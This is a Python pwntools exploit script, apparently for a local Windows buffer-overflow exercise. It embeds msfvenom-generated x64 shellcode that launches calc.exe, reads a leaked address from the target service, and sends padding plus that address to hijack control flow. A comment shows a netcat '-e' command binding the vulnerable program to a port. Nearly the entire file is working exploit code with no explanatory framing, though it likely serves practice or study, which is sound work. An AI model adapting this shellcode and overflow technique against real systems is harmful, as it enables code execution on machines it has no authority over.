#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft

# nc -l -p 10010 -e ./overflow.win.exe
c = remote("localhost", 10010)

context.os='windows'
context.arch='amd64'

# msfvenom -p windows/x64/exec CMD=calc.exe -f python -b '\x00\x0a\x0d'
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x80\xc8\xf8\x62\x4f\xf7\x0e"
buf += b"\xe6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x7c\x80\x7b\x86\xbf\x1f\xce\xe6\x80\xc8\xb9\x33\x0e"
buf += b"\xa7\x5c\xb7\xd6\x80\xc9\xb0\x2a\xbf\x85\xb4\xe0\x80"
buf += b"\x73\x30\x57\xbf\x85\xb4\xa0\x80\x73\x10\x1f\xbf\x01"
buf += b"\x51\xca\x82\xb5\x53\x86\xbf\x3f\x26\x2c\xf4\x99\x1e"
buf += b"\x4d\xdb\x2e\xa7\x41\x01\xf5\x23\x4e\x36\xec\x0b\xd2"
buf += b"\x89\xa9\x2a\xc4\xa5\x2e\x6d\xc2\xf4\xb0\x63\x9f\x7c"
buf += b"\x8e\x6e\x80\xc8\xf8\x2a\xca\x37\x7a\x81\xc8\xc9\x28"
buf += b"\x32\xc4\xbf\x16\xa2\x0b\x88\xd8\x2b\x4e\x27\xed\xb0"
buf += b"\xc8\x37\x31\x23\xc4\xc3\x86\xae\x81\x1e\xb5\x53\x86"
buf += b"\xbf\x3f\x26\x2c\x89\x39\xab\x42\xb6\x0f\x27\xb8\x28"
buf += b"\x8d\x93\x03\xf4\x42\xc2\x88\x8d\xc1\xb3\x3a\x2f\x56"
buf += b"\xa2\x0b\x88\xdc\x2b\x4e\x27\x68\xa7\x0b\xc4\xb0\x26"
buf += b"\xc4\xb7\x12\xaf\x81\x18\xb9\xe9\x4b\x7f\x46\xe7\x50"
buf += b"\x89\xa0\x23\x17\xa9\x57\xbc\xc1\x90\xb9\x3b\x0e\xad"
buf += b"\x46\x65\x6c\xe8\xb9\x30\xb0\x17\x56\xa7\xd9\x92\xb0"
buf += b"\xe9\x5d\x1e\x59\x19\x7f\x37\xa5\x2a\xf5\xf6\x0e\xe6"
buf += b"\x80\xc8\xf8\x62\x4f\xbf\x83\x6b\x81\xc9\xf8\x62\x0e"
buf += b"\x4d\x3f\x6d\xef\x4f\x07\xb7\xf4\x07\xbb\x44\xd6\x89"
buf += b"\x42\xc4\xda\x4a\x93\x19\x55\x80\x7b\xa6\x67\xcb\x08"
buf += b"\x9a\x8a\x48\x03\x82\x3a\xf2\xb5\xa1\x93\xba\x97\x08"
buf += b"\x4f\xae\x4f\x6f\x5a\x37\x2d\x01\x2e\x9b\x6d\xc8\xe5"
buf += b"\xb0\x9d\x62\x4f\xf7\x0e\xe6"

c.send(buf.ljust(512))
result = c.recvline().split(':')
addr = int(result[1].replace("\r\n",""), 16)

ans = 'A' * (24) + p64(addr)
c.sendline(ans.ljust(0x30))

c.interactive()
c.close()
